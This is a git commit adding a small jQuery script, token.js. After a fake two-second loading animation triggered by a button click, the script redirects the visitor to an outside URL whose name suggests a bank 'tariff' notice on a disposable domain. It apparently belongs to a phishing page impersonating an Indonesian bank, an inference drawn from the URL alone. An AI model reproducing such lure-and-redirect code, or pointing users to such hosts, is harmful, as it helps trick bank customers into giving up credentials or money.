26b0b982676105e75da04f62864b38f3fefcd1dd
dodypribadi5 <dodypribadi5@gmail.com>
2024-12-21 13:33:34 +0700

    Add files via upload

---
+++ token.js
@@ -0,0 +1,13 @@
+
+
+$(document).ready(function() {
+    $('#getcs').click(function() {
+    $("#process1").show();
+ $('.load').fadeIn();
+    setTimeout(function(){      
+location.href='https://tarifbriuraa.wasap.my/';
+ $("#process1").hide();
+ $('.load').fadeOut();        
+         }, 2000);
+     });    
+  });   
